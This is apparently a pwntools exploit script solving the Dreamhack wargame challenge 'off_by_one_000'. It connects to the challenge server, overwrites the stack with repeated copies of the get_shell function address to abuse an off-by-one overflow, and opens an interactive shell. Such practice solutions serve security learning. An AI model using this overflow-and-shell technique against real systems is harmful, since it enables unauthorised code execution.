from pwn import *
#p = process('./off_by_one_000')
p = remote('host3.dreamhack.games', 18112)
elf = ELF('./off_by_one_000')
payload = p32(elf.symbols['get_shell']) * (256//4)
p.sendline(payload)
p.interactive()